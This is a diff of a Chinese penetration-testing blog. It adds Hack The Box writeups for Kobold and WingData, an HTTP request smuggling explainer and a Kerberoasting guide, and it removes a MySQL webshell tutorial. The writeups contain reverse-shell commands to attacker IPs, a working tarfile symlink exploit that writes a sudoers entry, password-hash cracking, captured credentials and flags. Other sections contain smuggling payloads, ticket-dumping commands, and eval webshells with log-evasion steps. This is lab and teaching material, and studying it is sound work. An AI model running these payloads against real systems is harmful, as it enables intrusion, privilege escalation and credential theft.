+子域枚举ffuf -c -k -u &#x27;https://10.129.127.169/&#x27; \-H &#x27;Host: FUZZ.target.htb&#x27; \-w ~/SecLists/Discovery/DNS/combined_subdomains.txt \-ac
+
+发现了两个子领域：mcp.kobold.htb—— MCP Jam
+
+再全面扫一下端口：
+nmap -Pn -p- --min-rate 3000 -T4 kobold.htb
+
+
+发现还有一个3552端口
+但是直接访问 https://kobold.htb:3552/ 访问不了,但是http:&#x2F;&#x2F; 可以
+进入了一个登录页面
+
+Arcane 1.13.0
+但是没有用户名和密码，登录不了
+CVE-2026-23744还是得再从mcp.kobold.htb —— mcpJam入手：
+cve:CVE-2026-23744
+MCPJam inspector 是一个用于 MCP 服务器的本地优先开发平台。 版本 1.4.2 及更早版本存在远程代码执行（RCE）漏洞，攻击者可通过构造 HTTP 请求触发 MCP 服务器安装流程，从而实现远程代码执行。 MCPJam inspector 默认监听 0.0.0.0，而非仅限本地的 127.0.0.1
+poc:https://github.com/H1sok444/CVE-2026-23744-PoC#cve-2026-23744-poc
+脚本参考：HTB - Kobold-CSDN博客
+
+poc中使用 busybox nc -e /bin/sh 作为回连方式，但这种写法强依赖目标环境中存在 BusyBox 版本的 netcat，且要求其支持 -e 参数。靶场中，这个命令是可以弹shell，但不完整
+
+运行exp脚本：
+
+监听：
+
+拿到shell，进入ben用户
+
+拿到flag 1：faa4cc3bf937add58bfde63015625d15
+提权拿到shell之后发现是一个docker
+进入shell之后，先扫一下端口：
+
+LinPEAS它能自动搜索系统中可能存在的权限提升漏洞，包括错误配置的文件权限、敏感信息泄露、SUID&#x2F;SGID错误设置等，并通过醒目的颜色标记来突出显示潜在的安全风险。
+
+kali下载：
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+
+shell转载：
+wget http://10.10.14.55:8000/linpeas.sh &amp;&amp; chmod 755 linpeas.sh &amp;&amp; ./linpeas.sh
+
+
+发现docker 挂在8080端口，找到一个子域名bin.kobold.htb
+
+查找PrivateBin 2.0.2漏洞，发现1.7.7至2.0.3版本前存在本地文件包含漏洞（可能导致代码执行），以及CVE-2024-39899的URL缩短绕过漏洞
+
+本地文件包含 (LFI) 漏洞 (影响 1.7.7 - &lt;2.0.3)：源于模板切换功能，攻击者可能利用此漏洞读取敏感文件或实现远程代码执行 (RCE)。
+URL 缩短服务滥用 (CVE-2024-39899)：通过代理机制，攻击者可以缩短任意 URL，绕过限制，该漏洞在 1.7.4 版本已修复。
+跨站脚本漏洞 (CVE-2020-5223)：早期版本中存在，通常已在后来的版本中修复。
+
+Privatebin - 本地 LFI漏洞
+（补充一句：信息搜集的方法，在github上搜这个服务，找他的Security模块，下面有对应版本范围的漏洞）
+
+https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82
+漏洞点：当站点启用了 templateselection 配置后，服务端会信任客户端提供的 template cookie，并把它当成模板名去拼接本地文件路径，随后执行 include，如果攻击者把 template cookie 改成带 ../ 的相对路径，就能从 tpl/ 目录向上跳，去包含别的本地 PHP 文件。 GHSA 明确指出这里允许 directory traversal，但只会拼出 .php 文件；绝对路径不行，要用相对于 tpl 目录的路径
+写码：
+cd /privatebin-data/dataecho &#x27;&lt;?php phpinfo();?&gt;&#x27; &gt; pwn.php
+
+然后构造如下请求包
+GET / HTTP/1.1Host: bin.kobold.htb......Cookie: template=../data/pwn 
+
+
+验证成功，写入shell(https://www.ddosi.org/shell/#bind)
+
+echo &#x27;&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.55 1111 &gt;/tmp/f&quot;);?&gt;&#x27; &gt; pwn4.php
+
+然后bp发包，kali监听
+
+拿到shell，但是没拿到root.txt
+
+信息搜集
+（这里整理一下：一开始通过mcpjam的漏洞版本找到cve，rce拿到第一个用户的shell，进入shell之后发现是在docker，扫发现bin子域名，发现PrivateBin漏洞，利用本地 LFI任意文件读取漏洞，在tmp目录下写码写shell,弹shell,拿到第二个用户，目前还有3552端口的Arcane没有利用，而Arcane需要登录，所以现在就要找用户名和密码）
+
+找到一个配置文件 &#x2F;srv&#x2F;cfg&#x2F;conf.php
+发现数据库名和密码：像是PrivateBin 对应 MySQL 数据库的账号密码
+
+用arcane  ComplexP@sswordAdmin1928 登录
+
+这是 Arcane 的 Docker 管理后台 &#x2F; 仪表盘（Dashboard）
+Arcane 1.13.0
+
+在bin这个容器里进行命令执行，发现&#x2F;root被禁（当前没root权限）
+新创建一个容器
+利用Docker 的默认行为：如果镜像里没有显式指定 USER，容器默认就以 root 运行
+
+路径配置
+
+安全性设置为特权模式
+
+
+进入这个docker，在shell里命令执行，此时的docker 拥有root权限
+
+拿到flag 2：8c6652b331e18fe098e5bfd7759528cf
+
 
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>靶场</category>
       </categories>
       <tags>
-        <tag>Kerberos</tag>
-        <tag>域渗透</tag>
-        <tag>Kerberoasting</tag>
+        <tag>HTB</tag>
+        <tag>靶场</tag>
+        <tag>Kobold</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB WingData 靶场 Writeup</title>
+    <url>/2026/08/14/htb-wingdata/</url>
+    <content><![CDATA[Nmapnmap -sV 10.129.244.106
+
+
+22,80
+将机器主机名添加到本地主机文件中：
+echo &quot;10.129.244.106 wingdata.htb&quot; | sudo tee -a /etc/hosts
+
+10.129.244.106
+
+点击Client Portal 
+
+发现跳转到一个子域名ftp.wingdata.htb
+把这个域名加到本地
+echo &quot;10.129.244.106 ftp.wingdata.htb&quot; | sudo tee -a /etc/hosts
+
+
+这里复习了一下找子域名工具：Sublist3r，kali自带（这里不用）
+
+进入到一个登录页面：
+
+找一下cve：
+[CVE-2025-47812] Wing FTP Server v7.4.3
+Wing FTP 服务器存在未经身份验证的远程代码执行漏洞 [CVE-2025-47812]
+漏洞描述 ： &#x2F;loginok.html端点中不正确的 NULL 字节处理 允许通过 Lua 注入进行未经身份验证的远程代码执行
+
+Lua注入漏洞利用：
+在向loginok.html发起POST请求时，将一个空字节后跟Lua代码注入用户名中。成功认证后(即使匿名)，会返回一个UID Cookie。使用此UIDcookie对dir.html进行后续GET请求，触发注入的Lua代码执行，导致RCE。
+exp:https://www.exploit-db.com/exploits/52347
+poc:https://github.com/estebanzarate/CVE-2025-47812-Wing-FTP-Server-7.4.3-Unauthenticated-RCE-PoC
+
+拿到shell
+
+ls -lah 是 Linux 里很常用的查看目录内容命令
+
+
+然后在/opt/wftpserver/Data/1/users下的wacky.xml获得用户加密凭据
+
+但是这个poc只能进行命令执行，没有真正的拿到shell，不能文件读取
+
+换一个poc:
+4m3rr0r&#x2F;CVE-2025-47812-poc：Wing FTP 服务器远程代码执行（RCE）漏洞（CVE-2025-47812）
+
+然后反弹shell:
+python CVE-2025-47812.py -u http://ftp.wingdata.htb -c &quot;nc 10.10.15.166 8888 -e /bin/sh&quot; -v
+
+
+再读取/opt/wftpserver/Data/1/users下的wacky.xml
+cat /opt/wftpserver/Data/1/users/wacky.xml&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;USER_ACCOUNTS Description=&quot;Wing FTP Server User Accounts&quot;&gt;    &lt;USER&gt;        &lt;UserName&gt;wacky&lt;/UserName&gt;        &lt;EnableAccount&gt;1&lt;/EnableAccount&gt;        &lt;EnablePassword&gt;1&lt;/EnablePassword&gt;        &lt;Password&gt;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/Password&gt;        &lt;ProtocolType&gt;63&lt;/ProtocolType&gt;        &lt;EnableExpire&gt;0&lt;/EnableExpire&gt;        &lt;ExpireTime&gt;2025-12-02 12:02:46&lt;/ExpireTime&gt;        &lt;MaxDownloadSpeedPerSession&gt;0&lt;/MaxDownloadSpeedPerSession&gt;        &lt;MaxUploadSpeedPerSession&gt;0&lt;/MaxUploadSpeedPerSession&gt;        &lt;MaxDownloadSpeedPerUser&gt;0&lt;/MaxDownloadSpeedPerUser&gt;        &lt;MaxUploadSpeedPerUser&gt;0&lt;/MaxUploadSpeedPerUser&gt;        &lt;SessionNoCommandTimeOut&gt;5&lt;/SessionNoCommandTimeOut&gt;        &lt;SessionNoTransferTimeOut&gt;5&lt;/SessionNoTransferTimeOut&gt;        &lt;MaxConnection&gt;0&lt;/MaxConnection&gt;        &lt;ConnectionPerIp&gt;0&lt;/ConnectionPerIp&gt;        &lt;PasswordLength&gt;0&lt;/PasswordLength&gt;        &lt;ShowHiddenFile&gt;0&lt;/ShowHiddenFile&gt;        &lt;CanChangePassword&gt;0&lt;/CanChangePassword&gt;        &lt;CanSendMessageToServer&gt;0&lt;/CanSendMessageToServer&gt;        &lt;EnableSSHPublicKeyAuth&gt;0&lt;/EnableSSHPublicKeyAuth&gt;        &lt;SSHPublicKeyPath&gt;&lt;/SSHPublicKeyPath&gt;        &lt;SSHAuthMethod&gt;0&lt;/SSHAuthMethod&gt;        &lt;EnableWeblink&gt;1&lt;/EnableWeblink&gt;        &lt;EnableUplink&gt;1&lt;/EnableUplink&gt;        &lt;EnableTwoFactor&gt;0&lt;/EnableTwoFactor&gt;        &lt;TwoFactorCode&gt;&lt;/TwoFactorCode&gt;        &lt;ExtraInfo&gt;&lt;/ExtraInfo&gt;        &lt;CurrentCredit&gt;0&lt;/CurrentCredit&gt;        &lt;RatioDownload&gt;1&lt;/RatioDownload&gt;        &lt;RatioUpload&gt;1&lt;/RatioUpload&gt;        &lt;RatioCountMethod&gt;0&lt;/RatioCountMethod&gt;        &lt;EnableRatio&gt;0&lt;/EnableRatio&gt;        &lt;MaxQuota&gt;0&lt;/MaxQuota&gt;        &lt;CurrentQuota&gt;0&lt;/CurrentQuota&gt;        &lt;EnableQuota&gt;0&lt;/EnableQuota&gt;        &lt;NotesName&gt;&lt;/NotesName&gt;        &lt;NotesAddress&gt;&lt;/NotesAddress&gt;        &lt;NotesZipCode&gt;&lt;/NotesZipCode&gt;        &lt;NotesPhone&gt;&lt;/NotesPhone&gt;        &lt;NotesFax&gt;&lt;/NotesFax&gt;        &lt;NotesEmail&gt;&lt;/NotesEmail&gt;        &lt;NotesMemo&gt;&lt;/NotesMemo&gt;        &lt;EnableUploadLimit&gt;0&lt;/EnableUploadLimit&gt;        &lt;CurLimitUploadSize&gt;0&lt;/CurLimitUploadSize&gt;        &lt;MaxLimitUploadSize&gt;0&lt;/MaxLimitUploadSize&gt;        &lt;EnableDownloadLimit&gt;0&lt;/EnableDownloadLimit&gt;        &lt;CurLimitDownloadLimit&gt;0&lt;/CurLimitDownloadLimit&gt;        &lt;MaxLimitDownloadLimit&gt;0&lt;/MaxLimitDownloadLimit&gt;        &lt;LimitResetType&gt;0&lt;/LimitResetType&gt;        &lt;LimitResetTime&gt;1762103089&lt;/LimitResetTime&gt;        &lt;TotalReceivedBytes&gt;0&lt;/TotalReceivedBytes&gt;        &lt;TotalSentBytes&gt;0&lt;/TotalSentBytes&gt;        &lt;LoginCount&gt;2&lt;/LoginCount&gt;        &lt;FileDownload&gt;0&lt;/FileDownload&gt;        &lt;FileUpload&gt;0&lt;/FileUpload&gt;        &lt;FailedDownload&gt;0&lt;/FailedDownload&gt;        &lt;FailedUpload&gt;0&lt;/FailedUpload&gt;        &lt;LastLoginIp&gt;127.0.0.1&lt;/LastLoginIp&gt;        &lt;LastLoginTime&gt;2025-11-02 12:28:52&lt;/LastLoginTime&gt;        &lt;EnableSchedule&gt;0&lt;/EnableSchedule&gt;    &lt;/USER&gt;&lt;/USER_ACCOUNTS&gt;
+
+得到用户名和密码的hash：
+wacky
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
+爆破hash
+搜索salt
+grep -r -i &quot;salt&quot; /opt/wftpserver/Data
+
+
+找到salt为WingFTP
+
+注意参数：
+
+1400 &#x3D; SHA2-256
+1410 &#x3D; 带 salt 的 SHA256 格式
+
+
+hash.txt:
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
+
+爆破密码：
+hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
+
+
+密码：  !#7Blushing^*Bride5
+ssh连接ssh wacky@10.129.244.106
+
+连接成功，拿到flag 1 ：7216f65d9d41664d8725e6546ef01887
+
+提权
+有一个python脚本
+wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py#!/usr/bin/env python3import tarfileimport osimport sysimport reimport argparseBACKUP_BASE_DIR = &quot;/opt/backup_clients/backups&quot;STAGING_BASE = &quot;/opt/backup_clients/restored_backups&quot;def validate_backup_name(filename):    if not re.fullmatch(r&quot;^backup_\d+\.tar$&quot;, filename):        return False    client_id = filename.split(&#x27;_&#x27;)[1].rstrip(&#x27;.tar&#x27;)    return client_id.isdigit() and client_id != &quot;0&quot;def validate_restore_tag(tag):    return bool(re.fullmatch(r&quot;^[a-zA-Z0-9_]&#123;1,24&#125;$&quot;, tag))def main():    parser = argparse.ArgumentParser(        description=&quot;Restore client configuration from a validated backup tarball.&quot;,        epilog=&quot;Example: sudo %(prog)s -b backup_1001.tar -r restore_john&quot;    )    parser.add_argument(        &quot;-b&quot;, &quot;--backup&quot;,        required=True,        help=&quot;Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, &quot;             &quot;where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)&quot;    )    parser.add_argument(        &quot;-r&quot;, &quot;--restore-dir&quot;,        required=True,        help=&quot;Staging directory name for the restore operation. &quot;             &quot;Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). &quot;             &quot;Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).&quot;    )    args = parser.parse_args()    if not validate_backup_name(args.backup):        print(&quot;[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)&quot;, file=sys.stderr)        sys.exit(1)    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)    if not os.path.isfile(backup_path):        print(f&quot;[!] Backup file not found: &#123;backup_path&#125;&quot;, file=sys.stderr)        sys.exit(1)    if not args.restore_dir.startswith(&quot;restore_&quot;):        print(&quot;[!] --restore-dir must start with &#x27;restore_&#x27;&quot;, file=sys.stderr)        sys.exit(1)    tag = args.restore_dir[8:]    if not tag:        print(&quot;[!] --restore-dir must include a non-empty tag after &#x27;restore_&#x27;&quot;, file=sys.stderr)        sys.exit(1)    if not validate_restore_tag(tag):        print(&quot;[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores&quot;, file=sys.stderr)        sys.exit(1)    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)    print(f&quot;[+] Backup: &#123;args.backup&#125;&quot;)    print(f&quot;[+] Staging directory: &#123;staging_dir&#125;&quot;)    os.makedirs(staging_dir, exist_ok=True)    try:        with tarfile.open(backup_path, &quot;r&quot;) as tar:            tar.extractall(path=staging_dir, filter=&quot;data&quot;)        print(f&quot;[+] Extraction completed in &#123;staging_dir&#125;&quot;)    except (tarfile.TarError, OSError, Exception) as e:        print(f&quot;[!] Error during extraction: &#123;e&#125;&quot;, file=sys.stderr)        sys.exit(2)if __name__ == &quot;__main__&quot;:    main()
+
+漏洞点：
+tar.extractall(path=staging_dir, filter=&quot;data&quot;)
+
+
+
+它只校验了 备份文件名
+没有校验 tar 包内部成员
+直接对归档内容执行了解压
+
+Python 的 tarfile 文档里，filter=&quot;data&quot; 的设计目标确实是拒绝绝对路径、拒绝解压到目标目录外、并清理部分危险权限位。也就是它本来是“更安全的解压模式”。
+但问题在于，NVD 和 Red Hat 后续都记录了 Python 3.12+ 的 tarfile 提取过滤器相关漏洞：即使使用 filter=&quot;data&quot; 或 filter=&quot;tar&quot;，在处理不可信 tar 包时，仍可能发生越界写入提取目录之外的问题。
+所以，这段脚本的风险判断可以概括成一句话：
+如果攻击者能控制备份 tar 内容，而这个脚本又以更高权限运行，那么这里就是高风险点
+
+CVE-2025-4517poc:CVE-2025-4517-poc&#x2F;CVE-2025-4517.py at main · StealthByte0&#x2F;CVE-2025-4517-poc
+写入exp脚本：
+cat &gt; /tmp/exploit.py &lt;&lt;&#x27;PY&#x27;import tarfileimport osimport ioimport syscomp = &#x27;d&#x27; * 247steps = &quot;abcdefghijklmnop&quot;path = &quot;&quot;with tarfile.open(&quot;/tmp/backup_9999.tar&quot;, mode=&quot;w&quot;) as tar:    for i in steps:        a = tarfile.TarInfo(os.path.join(path, comp))        a.type = tarfile.DIRTYPE        tar.addfile(a)                b = tarfile.TarInfo(os.path.join(path, i))        b.type = tarfile.SYMTYPE        b.linkname = comp        tar.addfile(b)                path = os.path.join(path, comp)        linkpath = os.path.join(&quot;/&quot;.join(steps), &quot;l&quot;*254)    l = tarfile.TarInfo(linkpath)    l.type = tarfile.SYMTYPE    l.linkname = &quot;../&quot; * len(steps)    tar.addfile(l)        e = tarfile.TarInfo(&quot;escape&quot;)    e.type = tarfile.SYMTYPE    e.linkname = linkpath + &quot;/../../../../../../../etc&quot;    tar.addfile(e)        f = tarfile.TarInfo(&quot;sudoers_link&quot;)    f.type = tarfile.LNKTYPE    f.linkname = &quot;escape/sudoers&quot;    tar.addfile(f)        content = b&quot;wacky ALL=(ALL) NOPASSWD: ALL\n&quot;    c = tarfile.TarInfo(&quot;sudoers_link&quot;)    c.type = tarfile.REGTYPE    c.size = len(content)    tar.addfile(c, fileobj=io.BytesIO(content))print(&quot;[+] Exploit created&quot;)PY
+
+生成恶意 tar 文件
+python3 /tmp/exploit.py
+
+复制这个恶意的tar文件到sudo权限的目录下
+cp /tmp/backup_9999.tar /opt/backup_clients/backups/
+
+运行 sudo 脚本触发漏洞
+sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \  -b backup_9999.tar \              -r restore_evil
+
+
+-b backup_9999.tar &#x3D; 指定要恢复的备份包名字是 backup_9999.tar
+-r restore_evil &#x3D; 指定恢复到 restore_evil 这个目录
+
+
+sudo -l
+sudo su
+
+拿到flag 2： c1a6f37882dc5883a8dad98e0b2197aa
+
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>HTB</tag>
+        <tag>靶场</tag>
+        <tag>WingData</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP 请求走私</title>
+    <url>/2026/08/14/http-request-smuggling/</url>
+    <content><![CDATA[HTTP请求走私是一种攻击技术，利用前端和后端服务器对HTTP请求的解析差异，将恶意请求夹带在合法请求中，从而绕过安全控制，访问敏感数据或攻击其他用户。
+漏洞原理：HTTP请求走私漏洞的产生主要是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：Content-Length头和Transfer-Encoding头。前端和后端服务器可能对这两种头的处理方式不同，从而导致请求边界的不同步。
+Content-Length头
+POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling
+
+Transfer-Encoding头
+POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0
+
+常见的HTTP请求走私类型
+
+CL-TE漏洞：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。
+TE-CL漏洞：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。
+TE-TE漏洞：前端和后端服务器都使用Transfer-Encoding头，但可以通过混淆头来诱导其中一台服务器不处理它。
+
+入口点:HTTP请求走私的攻击入口主要存在于前端代理服务器与后端应用服务器之间的连接链路上，常见的入口场景包括：
+1. 反向代理 &#x2F; 负载均衡器
+Nginx、Apache、HAProxy、F5、Cloudflare 等反向代理或负载均衡设备与后端 Tomcat、Jetty、Node.js 等应用服务器之间
+代理层负责连接复用（keep-alive），将多个前端请求复用到同一条后端 TCP 连接上
+
+2. CDN &#x2F; WAF 后端
+CDN 节点与源站服务器之间
+WAF（Web应用防火墙）仅检查前端可见的请求部分，走私的恶意请求被后端单独解析从而绕过 WAF 检测
+
+3. 支持 HTTP 管道化 &#x2F; 连接复用的网关
+API 网关、微服务网关（如 Kong、Zuul、Spring Cloud Gateway）
+任何将多个 HTTP 请求复用到同一后端 TCP 连接的中间件
+
+4. 常见可利用的页面&#x2F;接口
+登录接口、用户认证页面（可走私出其他用户的会话）
+搜索、评论等反射型输入点（可配合 XSS 扩大危害）
+静态资源缓存节点（可实施缓存投毒）
+
+
+利用思路:基本原理回顾
+攻击者构造一个包含两个请求边界的特制请求：前端服务器按一种方式解析（认为是一个请求），后端服务器按另一种方式解析（认为是两个请求），从而将第二个”隐藏请求”走私到后端。
+三类漏洞的利用方式CL-TE 漏洞（前端用CL，后端用TE）
+思路：前端根据 Content-Length 认为请求已结束，将完整请求转发给后端；后端按 Transfer-Encoding: chunked 解析，第一个 chunk 结束后，剩余内容被当作下一个独立请求处理
+利用：在请求体中嵌入第二个请求，后端会单独处理该走私请求
+
+POST / HTTP/1.1Host: target.comContent-Length: 50Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: target.comX: 
+
+TE-CL 漏洞（前端用TE，后端用CL）
+思路：前端按 chunked 解析，读到 0\r\n\r\n 认为请求结束；后端根据 Content-Length 判断请求长度，超出部分被拼接到下一个用户的请求前面
+利用：走私的请求前缀会污染下一个请求，影响其他用户
+
+POST / HTTP/1.1Host: target.comContent-Length: 4Transfer-Encoding: chunked5cGET /admin HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10
+
+TE-TE 漏洞（两端都用TE，但可混淆）
+思路：前后端都支持 chunked，但通过混淆 Transfer-Encoding 头（如加空格、大小写变体、重复头、前缀后缀），让其中一台服务器不识别该头，转而使用 Content-Length 或忽略
+常见混淆手法：
+Transfer-Encoding: xchunked（加前缀）
+Transfer-Encoding : chunked（冒号后多空格）
+Transfer-Encoding: chunked, identity（多值）
+重复的 Transfer-Encoding 头
+大小写变体：transfer-encoding、TRANSFER-ENCODING
+
+
+
+进阶利用场景
+
+
+利用场景
+说明
+
+
+
+绕过访问控制
+走私请求直接访问被前端&#x2F;WAF拦截的路径（如 &#x2F;admin）
+
+
+缓存投毒
+将恶意响应写入缓存，影响所有访问该缓存的用户
+
+
+会话劫持
+通过走私请求窃取其他用户的请求头中的 Cookie &#x2F; Token
+
+
+XSS 升级
+将反射型 XSS 转化为存储型&#x2F;扩散型危害
+
+
+凭据窃取
+走私请求诱导后端将下一个用户的请求内容返回给攻击者
+
+
+
+代码特点1. 同时存在两种长度标识请求中同时出现 Content-Length 和 Transfer-Encoding 头，且两端服务器对优先级处理不一致：
+
+有的服务器优先使用 Content-Length
+有的服务器优先使用 Transfer-Encoding
+有的服务器在两者共存时报错，有的则静默选择其中一个
+
+2. Transfer-Encoding 解析不严格后端代码对 Transfer-Encoding 头的解析存在宽松匹配问题：
+// 不安全的解析示例：未严格校验头格式if (header.contains(&quot;chunked&quot;)) &#123;    useChunked = true;&#125;// 应使用严格的 equals 或规范化后比较
+
+3. 前后端使用不同的 HTTP 解析库
+前端用 Nginx（C 语言解析），后端用 Tomcat（Java 解析）
+不同语言、不同库对 HTTP 规范的实现细节存在差异
+特别是对模糊边界情况（重复头、空格、大小写）的处理不一致
+
+4. 代理层未正确规范化请求头
+代理服务器在转发请求前，没有移除或规范化歧义的请求头
+安全的代理应在检测到 CL + TE 共存时，优先以 TE 为准并移除 CL，或直接拒绝请求
+
+5. Chunked 编码边界处理缺陷
+对 chunk size 的解析不严格（允许前导零、空白字符）
+对最后一个 chunk（0\r\n\r\n）的尾部处理不完善
+chunk 扩展字段（chunk extensions）处理逻辑存在漏洞
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>HTTP请求走私</tag>
       </tags>
   </entry>
   <entry>
@@ -3345,6 +3499,68 @@ NTLM Relay 攻击防御核心防御：LDAP 签名域内 NTLM Relay 最常见的�
       </tags>
   </entry>
   <entry>
+    <title>攻击方式 - Kerberoasting</title>
+    <url>/2026/08/14/kerberoasting/</url>
+    <content><![CDATA[定义：攻击者通过正常域用户密码认证获取 TGT，利用该 TGT 请求指定 SPN 的 ST 时指定 易破解的 RC4_HMAC_MD5 加密类型。若 TGT 有效，KDC 会用注册该 SPN 的账户 Hash 加密 ST 返回，攻击者提取后可离线爆破出该账户明文密码，如果该服务在域内被配置为高权限运行，那么攻击者可能接管整个域。
+攻击条件：
+攻击者拥有一个有效的域用户账户和密码（能正常申请 TGT）
+目标服务账户在 AD 中注册了 SPN（Service Principal Name）
+攻击者网络可达域控（KDC），能与 88 端口通信
+服务账户密码强度较弱（可被字典爆破）
+不需要管理员权限，普通域用户即可请求任意 SPN 的 ST
+
+实战场景：在域环境里，拿到普通域用户权限后，找注册了 SPN 的服务账户，请求其 TGS 服务票据并离线爆破密码。
+攻击过程：查询域内注册于域用户下的SPN工具1：RiskySPNRiskySPN是一个PowerShell脚本的集合，专检测与SPN相关的账户是否滥用，自动识别弱密码服务票据
+# 1. 导入模块Import-Module .\RiskySPN.psm1# 2. 查询域内所有注册了 SPN 的用户账户Get-RiskySPN# 3. 自动识别弱密码服务票据（核心功能）Find-PotentiallyCrackableAccounts# 4. 请求指定 SPN 的 TGS 票据并导出 hash（hashcat 格式）Get-TGSCipher -SPN &quot;MSSQLSVC/server01.域名.com&quot; -Format hashcat# 5. 批量一键操作：查找 + 请求 + 导出所有可破解账户的 hashFind-PotentiallyCrackableAccounts | Get-TGSCipher -Format hashcat
+
+工具2：PowerView.ps1# 1. 导入 PowerView 模块Import-Module .\PowerView.ps1# 2. 查询所有注册了 SPN 的用户账户（最常用）Get-NetUser -SPN | select samaccountname, serviceprincipalname# 3. 新版 PowerView 命令（Dev 分支）Get-DomainUser -SPN | select samaccountname, serviceprincipalname
+
+请求指定SPN的STRuberus# 请求指定 SPN 的 ST + 导出 hashRubeus.exe kerberoast /spn:服务名/主机名.域名.com /outfile:hash.txt# 批量请求所有 SPNRubeus.exe kerberoast /outfile:hash.txt
+
+mimikatz# 请求指定 SPN 的 STkerberos::ask /target:服务名/主机名.域名.com# 导出所有票据kerberos::list /export
+
+GetUserSPNs.py# 请求指定 SPN 的 ST + 导出 hashpython GetUserSPNs.py 域名/用户名:密码 -request -spn 服务名/主机名.域名.com -outputfile hash.txt# 批量请求所有 SPNpython GetUserSPNs.py 域名/用户名:密码 -request -outputfile hash.txt
+
+导出请求的ST查看内存中的票据用cmd:
+Klist
+
+导出内存中的票据mimikatz：（在mimikatz同目录下直接导出.kirbi文件）
+kerberos::list /export
+
+补充：从 LSASS 内存中提取（mimikatz 另一种方式）
+# 从LSASS进程内存中提取所有Kerberos票据sekurlsa::kerberos /export
+
+
+这种方式需要管理员权限，能拿到所有登录用户的票据，包括别人的
+
+Rubeus  ：# 导出所有 Kerberos 票据（包括 ST）为 .kirbi 文件Rubeus.exe dump /outfile:tickets
+
+GetUserSPNs.py# 直接导出 hashcat 格式，不用 kirbi 中转python GetUserSPNs.py 域名/用户名:密码 -request -outputfile hash.txt
+
+离线爆破ST格式转换（kirbi → hashcat ）用 Rubeus 转换Rubeus.exe kerberoast /spn:服务名/主机名.域名.com /outfile:hash.txt
+
+用hashcat爆破用Rubeus或GetUserSPNs.py导出的hash.txt用以下命令：
+hashcat -m 13100 hash.txt rockyou.txt
+
+用 tgsrepcrack.py脚本 对mimikatz导出的.kirbi票据进行爆破：
+python tgsrepcrack.py rockyou.txt ticket.kirbi
+
+
+
+
+ AS-REP Roasting 的 hash，hashcat 用 -m 18200，Kerberoasting 的用 -m 13100，别搞混了  
+
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Kerberos</tag>
+        <tag>域渗透</tag>
+        <tag>Kerberoasting</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL 注入的原理及测试</title>
     <url>/2026/08/14/sql-injection-principles/</url>
     <content><![CDATA[SQL 注入原理：SQL 注入的本质是代码与数据未分离。当用户可控的输入被直接拼接到 SQL 语句中执行时，攻击者可以通过构造恶意输入改变原有 SQL 的逻辑，从而执行非预期的数据库操作。
@@ -3597,54 +3813,6 @@ union 能用
       </categories>
       <tags>
         <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL 注入写 shell</title>
-    <url>/2026/08/14/sql-injection-write-shell/</url>
-    <content><![CDATA[通过 MySQL 写入 WebShell 是一种常见的安全测试技术，通常需要特定权限和配置。
-方法 1：使用 OUTFILE 写入 Shell原理：把 SELECT 查询结果写入文件。
-条件：
-数据库用户具有 FILE 权限。
-知道目标网站的绝对路径，并且该路径具有写入权限。
-secure_file_priv 参数未限制写入路径。
-
-执行以下 SQL 语句，将一句话木马写入文件：
-SELECT &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27; INTO OUTFILE &#x27;C:/phpStudy/WWW/shell.php&#x27;;
-
-验证文件是否成功写入，并通过 Web 访问测试。
-注意：OUTFILE 会在每行末尾添加换行符，适合写文本文件。
-如果路径受限，可尝试修改 MySQL 配置文件中的 secure_file_priv 参数。
-方法 2：利用全局日志写入 Shell原理：开启 MySQL 通用日志（general log），把日志文件路径改成网站目录下的 .php，然后执行一句带木马的 SQL，日志里就有木马了。
-步骤：检查全局日志是否开启：
-SHOW VARIABLES LIKE &#x27;%general_log%&#x27;;
-
-开启全局日志并设置日志路径为目标目录：
-SET GLOBAL general_log = &#x27;ON&#x27;;SET GLOBAL general_log_file = &#x27;C:/phpStudy/WWW/shell.php&#x27;;
-
-执行一条包含 WebShell 的查询语句：
-SELECT &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;;
-
-恢复原始日志配置以避免被发现：
-SET GLOBAL general_log = &#x27;OFF&#x27;;
-
-方法 3：通过慢查询日志写入 Shell步骤：检查慢查询日志是否开启：
